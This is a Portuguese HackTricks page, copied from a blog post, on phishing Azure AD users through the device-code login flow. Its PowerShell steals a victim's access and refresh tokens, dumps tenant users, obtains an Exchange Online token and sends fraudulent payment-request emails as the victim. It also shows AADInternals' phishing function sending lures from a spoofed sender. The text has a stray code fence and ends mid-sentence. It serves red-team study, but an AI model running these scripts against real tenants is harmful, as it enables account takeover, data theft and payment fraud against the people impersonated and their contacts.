# Az - Phishing de Autentica√ß√£o de C√≥digo de Dispositivo

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

**Este post foi copiado de** [**https://o365blog.com/post/phishing/**](https://o365blog.com/post/phishing/)

### O que √© autentica√ß√£o de c√≥digo de dispositivo <a href="#what-is-device-code-authentication" id="what-is-device-code-authentication"></a>

De acordo com a [documenta√ß√£o](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code) da Microsoft, a autentica√ß√£o de c√≥digo de dispositivo:

> permite que os usu√°rios fa√ßam login em dispositivos com restri√ß√£o de entrada, como uma smart TV, dispositivo IoT ou impressora. Para habilitar esse fluxo, o dispositivo faz com que o usu√°rio visite uma p√°gina da web em seu navegador em outro dispositivo para fazer login. Depois que o usu√°rio faz login, o dispositivo pode obter tokens de acesso e tokens de atualiza√ß√£o conforme necess√°rio.

O processo √© o seguinte:

1. Um usu√°rio inicia um aplicativo que suporta o fluxo de c√≥digo de dispositivo em um dispositivo
2. O aplicativo se conecta ao endpoint /devicecode do Azure AD e envia **client\_id** e **resource**
3. O Azure AD envia de volta **device\_code**, **user\_code** e **verification\_url**
4. O dispositivo mostra o **verification\_url** (hxxps://microsoft.com/devicelogin) e o **user\_code** para o usu√°rio
5. O usu√°rio abre um navegador e navega at√© **verification\_url**, fornece o **user\_code** quando solicitado e faz login
6. O dispositivo consulta o Azure AD at√© que, ap√≥s o login bem-sucedido, ele obtenha **access\_token** e **refresh\_token**

![Fluxo de C√≥digo de Dispositivo](https://o365blog.com/images/posts/phishing\_5.png)

### Phishing com autentica√ß√£o de c√≥digo de dispositivo <a href="#phishing-with-device-code-authentication" id="phishing-with-device-code-authentication"></a>

A ideia b√°sica de utilizar a autentica√ß√£o de c√≥digo de dispositivo para phishing √© a seguinte.

1. Um atacante se conecta ao endpoint /devicecode e envia **client\_id** e **resource**
2. Ap√≥s receber **verification\_uri** e **user\_code**, cria um e-mail contendo um link para **verification\_uri** e **user\_code** e envia para a v√≠tima.
3. A v√≠tima clica no link, fornece o c√≥digo e conclui o login.
4. O atacante recebe **access\_token** e **refresh\_token** e agora pode imitar a v√≠tima.

#### 1. Conectando-se ao endpoint /devicecode <a href="#1-connecting-to-devicecode-endpoint" id="1-connecting-to-devicecode-endpoint"></a>

O primeiro passo √© fazer um POST http para o endpoint de c√≥digo de dispositivo do Azure AD:

```
 https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0
```
# Loop enquanto a autoriza√ß√£o est√° pendente ou at√© que o tempo limite seja excedido

while($continue)
{
	Start-Sleep -Seconds $interval
	$total += $interval

	if($total -gt $expires)
	{
		Write-Error "O tempo limite foi atingido"
		return
	}
				
	# Tenta obter a resposta. Dar√° 40x enquanto estiver pendente, ent√£o precisamos tentar e capturar

	try
	{
		$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
	}
	catch
	{
		# Este √© o fluxo normal, sempre retorna 40x a menos que seja bem-sucedido

		$details=$_.ErrorDetails.Message | ConvertFrom-Json
		$continue = $details.error -eq "authorization_pending"
		Write-Host $details.error

		if(!$continue)
		{
			# N√£o est√° pendente, ent√£o este √© um erro real

			Write-Error $details.error_description
			return
		}
	}

	# Se obtivermos uma resposta, tudo bem!

	if($response)
	{
		break # Saia do loop

	}
}
```

Agora podemos usar o token de acesso para se passar pela v√≠tima:

```powershell
# Despeje os usu√°rios do locat√°rio em csv

Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
```

Tamb√©m podemos obter tokens de acesso para outros servi√ßos usando o token de atualiza√ß√£o, desde que o client\_id permane√ßa o mesmo.

O seguinte script obt√©m um token de acesso para o Exchange Online.

```powershell
# Crie o corpo para obter o token de acesso para o Exchange Online

$body=@{
	"client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	"grant_type" =    "refresh_token"
	"scope" =         "openid"
	"resource" =      "https://outlook.office365.com"
	"refresh_token" = $response.refresh_token
}

$EXOresponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

# Envie um e-mail como a v√≠tima

Send-AADIntOutlookMessage -AccessToken $EXOresponse.access_token -Recipient "outra.vitima@alvo.org" -Subject "Pagamento em atraso" -Message "Pague isso <h2>o mais r√°pido poss√≠vel!</h2>"
```

## Usando o AADInternals para phishing <a href="#using-aadinternals-for-phishing" id="using-aadinternals-for-phishing"></a>

O AADInternals (v0.4.4 ou posterior) tem uma fun√ß√£o [Invoke-AADIntPhishing](https://o365blog.com/aadinternals/#invoke-aadintphishing) que automatiza o processo de phishing.

A mensagem de phishing pode ser personalizada, a mensagem padr√£o √© a seguinte:

```
'<div>Ol√°!<br/>Esta √© uma mensagem enviada a voc√™ por algu√©m que est√° usando a fun√ß√£o de phishing do <a href="https://o365blog.com/aadinternals">AADInternals</a>. <br/><br/>Aqui est√° um <a href="{1}">link</a> que voc√™ <b>n√£o deve clicar</b>.<br/><br/>Se ainda assim decidir faz√™-lo, forne√ßa o seguinte c√≥digo quando solicitado: <b>{0}</b>.</div>'
```

Mensagem padr√£o no e-mail:\
![E-mail de phishing](https://o365blog.com/images/posts/phishing\_11.png)

Mensagem padr√£o no Teams:\
![Mensagem de phishing](https://o365blog.com/images/posts/phishing\_12.png)

### E-mail <a href="#email" id="email"></a>

O seguinte exemplo envia um e-mail de phishing usando uma mensagem personalizada. Os tokens s√£o salvos no cache.

```powershell
# Crie uma mensagem personalizada

$message = '<html>Ol√°!<br/>Aqui est√° o link para o <a href="{1}">documento</a>. Use o seguinte c√≥digo para acessar: <b>{0}</b>.</html>'

# Envie um e-mail de phishing para os destinat√°rios usando uma mensagem personalizada e salve os tokens no cache

Invoke-AADPhishing -Recipients "vitima@empresa.com","vitima2@empresa.com" -Subject "Johnny compartilhou um documento com voc√™" -Sender "Johnny Carson <jc@algumlugar.com>" -SMTPServer smtp.meuservidor.local -Message $message -SaveToCache 
```

```
C√≥digo: CKDZ2BURF
E-mail enviado para: vitima@empresa.com
...
Token de acesso recebido para william.victim@company.com
```

E agora podemos enviar e-mails como a v√≠tima usando o token armazenado em cache.

```powershell
# Envie um e-mail como a v√≠tima

Send-AADIntOutlookMessage -Recipient "outra.vitima@alvo.org" -Subject "Pagamento em atraso" -Message "Pague isso <h2>o mais r√°pido poss√≠vel!</h2>"
```

Tamb√©m podemos enviar uma mensagem do Teams para tornar o pedido de pagamento